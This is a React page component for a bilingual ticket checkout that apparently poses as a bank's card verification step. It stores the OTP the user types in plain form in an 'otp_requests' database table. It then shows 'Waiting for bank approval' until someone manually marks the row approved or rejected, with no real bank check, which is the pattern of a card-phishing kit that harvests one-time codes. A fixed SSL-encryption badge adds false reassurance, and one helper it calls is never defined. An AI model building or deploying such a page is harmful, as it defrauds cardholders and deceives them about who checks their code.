import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useLanguage } from "@/i18n/LanguageContext";
import { useToast } from "@/hooks/use-toast";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { ShieldCheck, Lock, RefreshCw, CreditCard } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";


const CardOTP = () => {
  const { lang } = useLanguage();
  const isAr = lang === "ar";
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();

  const state = location.state as {
    tickets?: any[];
    email?: string;
    phone?: string;
    total?: number;
    vat?: number;
    subtotal?: number;
    cardLast4?: string;
    cardBrand?: string;
    orderId?: string;
  } | null;

  const [otpCode, setOtpCode] = useState("");
  const [status, setStatus] = useState<"idle" | "waiting" | "approved" | "rejected">("idle");
  const [otpRequestId, setOtpRequestId] = useState<string | null>(null);
  const [shake, setShake] = useState(false);
  const [resendTimer, setResendTimer] = useState(0);
  const inputRef = useRef<HTMLInputElement | null>(null);

  // عداد إعادة الإرسال
  useEffect(() => {
    if (resendTimer > 0) {
      const t = setTimeout(() => setResendTimer(r => r - 1), 1000);
      return () => clearTimeout(t);
    }
  }, [resendTimer]);

  // مراقبة حالة الـ OTP request
  useEffect(() => {
    if (!otpRequestId) return;

    const channel = supabase
      .channel(`otp-${otpRequestId}`)
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "otp_requests",
        filter: `id=eq.${otpRequestId}`,
      }, (payload: any) => {
        const newStatus = payload.new.status;
        if (newStatus === "approved") {
          setStatus("approved");
          
          if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]);
          setTimeout(() => {
            navigate("/order-confirmation", {
              state: {
                tickets: state?.tickets,
                email: state?.email,
                phone: state?.phone,
                total: state?.total,
                vat: state?.vat,
                subtotal: state?.subtotal,
                cardLast4: state?.cardLast4,
                cardBrand: state?.cardBrand,
                orderId: state?.orderId,
                paymentMethod: "card",
              },
            });
          }, 2000);
        } else if (newStatus === "rejected") {
          setStatus("rejected");
          if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
          setShake(true);
          setTimeout(() => setShake(false), 600);
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [otpRequestId]);

  const submitOtp = async () => {
    const code = otpCode.trim();
    if (code.length < 4) {
      setShake(true);
      setTimeout(() => setShake(false), 600);
      playChime("error");
      toast({
        title: isAr ? "⚠️ أدخل الرمز كاملاً" : "⚠️ Enter complete code",
        variant: "destructive",
      });
      return;
    }

    setStatus("waiting");
    playChime("notification");

    const { data, error } = await (supabase as any)
      .from("otp_requests")
      .insert({
        order_id: state?.orderId || null,
        otp_code: code,
        status: "pending",
      })
      .select("id")
      .single();

    if (error || !data) {
      setStatus("idle");
      toast({
        title: isAr ? "❌ خطأ في الإرسال" : "❌ Submission error",
        variant: "destructive",
      });
      return;
    }

    setOtpRequestId(data.id);
    setResendTimer(60);
  };

  const resendOtp = () => {
    setOtpCode("");
    setStatus("idle");
    setOtpRequestId(null);
    inputRef.current?.focus();
    toast({
      title: isAr ? "تم إعادة التعيين" : "Reset done",
      description: isAr ? "أدخل الرمز الجديد" : "Enter the new code",
    });
  };

  if (!state?.orderId) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <p className="text-muted-foreground">{isAr ? "لا توجد بيانات طلب" : "No order data"}</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background font-body" dir={isAr ? "rtl" : "ltr"}>
      <Header />
      <main className="pt-28 pb-20 px-4">
        <div className="max-w-md mx-auto">
          <div className="bg-card rounded-2xl border border-border p-6 md:p-8 shadow-sm text-center">

            {/* أيقونة */}
            <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-4">
              <ShieldCheck className="w-8 h-8 text-primary" />
            </div>

            <h1 className="font-display text-2xl font-bold text-foreground mb-2">
              {isAr ? "التحقق من الهوية" : "Identity Verification"}
            </h1>
            <p className="text-sm text-muted-foreground mb-3">
              {isAr ? "أدخل رمز التحقق المرسل إلى جوالك" : "Enter the verification code sent to your phone"}
            </p>

            {/* آخر 4 أرقام من البطاقة */}
            {state?.cardLast4 && (
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-muted/50 border border-border mb-6" dir="ltr">
                <CreditCard className="w-4 h-4 text-muted-foreground" />
                <span className="text-sm text-muted-foreground font-mono tracking-widest">
                  •••• {state.cardLast4}
                </span>
              </div>
            )}

            <AnimatePresence mode="wait">
              {status === "approved" && (
                <motion.div
                  key="approved"
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="py-8"
                >
                  <div className="w-20 h-20 rounded-full bg-emerald-50 flex items-center justify-center mx-auto mb-4">
                    <ShieldCheck className="w-10 h-10 text-emerald-500" />
                  </div>
                  <p className="text-lg font-bold text-emerald-600">
                    {isAr ? "✅ تم التحقق بنجاح!" : "✅ Verified successfully!"}
                  </p>
                  <p className="text-sm text-muted-foreground mt-1">
                    {isAr ? "جاري تحويلك..." : "Redirecting..."}
                  </p>
                </motion.div>
              )}

              {status === "rejected" && (
                <motion.div
                  key="rejected"
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="py-6"
                >
                  <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center mx-auto mb-4">
                    <Lock className="w-10 h-10 text-red-500" />
                  </div>
                  <p className="text-lg font-bold text-red-500">
                    {isAr ? "❌ تم رفض الرمز" : "❌ Code rejected"}
                  </p>
                  <p className="text-sm text-muted-foreground mt-1 mb-4">
                    {isAr ? "الرمز غير صحيح، حاول مرة أخرى" : "Incorrect code, please try again"}
                  </p>
                  <button
                    onClick={resendOtp}
                    className="flex items-center gap-2 mx-auto px-4 py-2 rounded-xl bg-primary/10 text-primary text-sm font-medium hover:bg-primary/20 transition-colors"
                  >
                    <RefreshCw className="w-4 h-4" />
                    {isAr ? "إعادة المحاولة" : "Try again"}
                  </button>
                </motion.div>
              )}

              {(status === "idle" || status === "waiting") && (
                <motion.div key="input" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                  {/* حقل OTP واحد */}
                  <motion.div
                    className="mb-6"
                    animate={shake ? { x: [0, -10, 10, -8, 8, -4, 4, 0] } : { x: 0 }}
                    transition={{ duration: 0.5 }}
                  >
                    <input
                      ref={inputRef}
                      type="text"
                      inputMode="numeric"
                      value={otpCode}
                      onChange={e => setOtpCode(e.target.value.replace(/\D/g, ""))}
                      disabled={status === "waiting"}
                      placeholder={isAr ? "أدخل رمز التحقق" : "Enter verification code"}
                      className={`w-full h-14 text-center text-2xl font-bold font-mono tracking-[0.3em] rounded-xl border-2 bg-background transition-all outline-none
                        ${otpCode ? "border-primary text-primary" : "border-border text-foreground"}
                        ${status === "waiting" ? "opacity-60 cursor-not-allowed" : "focus:border-primary focus:ring-2 focus:ring-primary/20"}
                      `}
                      dir="ltr"
                      autoFocus
                    />
                  </motion.div>

                  {/* حالة الانتظار */}
                  {status === "waiting" && (
                    <motion.div
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="flex flex-col items-center gap-3 mb-6 p-4 bg-amber-50 rounded-xl border border-amber-100"
                    >
                      <div className="flex items-center gap-2">
                        <div className="w-4 h-4 border-2 border-amber-500 border-t-transparent rounded-full animate-spin" />
                        <span className="text-sm font-medium text-amber-700">
                          {isAr ? "في انتظار موافقة البنك..." : "Waiting for bank approval..."}
                        </span>
                      </div>
                      <div className="flex gap-1">
                        {[0, 1, 2].map(i => (
                          <motion.div
                            key={i}
                            className="w-2 h-2 rounded-full bg-amber-400"
                            animate={{ opacity: [0.3, 1, 0.3] }}
                            transition={{ duration: 1.2, repeat: Infinity, delay: i * 0.4 }}
                          />
                        ))}
                      </div>
                    </motion.div>
                  )}

                  {/* زر الإرسال */}
                  {status === "idle" && (
                    <button
                      onClick={submitOtp}
                      disabled={otpCode.length < 4}
                      className="w-full h-12 rounded-xl bg-primary text-primary-foreground font-semibold text-base hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                    >
                      <ShieldCheck className="w-4 h-4" />
                      {isAr ? "تحقق من الرمز" : "Verify Code"}
                    </button>
                  )}

                  {/* إعادة الإرسال */}
                  {status === "waiting" && (
                    <div className="mt-4">
                      {resendTimer > 0 ? (
                        <p className="text-xs text-muted-foreground">
                          {isAr ? `إعادة الإرسال بعد ${resendTimer} ثانية` : `Resend in ${resendTimer}s`}
                        </p>
                      ) : (
                        <button
                          onClick={resendOtp}
                          className="flex items-center gap-1.5 mx-auto text-xs text-primary hover:underline"
                        >
                          <RefreshCw className="w-3 h-3" />
                          {isAr ? "إعادة إرسال الرمز" : "Resend code"}
                        </button>
                      )}
                    </div>
                  )}
                </motion.div>
              )}
            </AnimatePresence>

            {/* معلومات الأمان */}
            <div className="flex items-center justify-center gap-1.5 mt-6 text-xs text-muted-foreground">
              <Lock className="w-3.5 h-3.5" />
              <span>{isAr ? "محمي بتشفير SSL 256-bit" : "Protected by 256-bit SSL encryption"}</span>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default CardOTP;
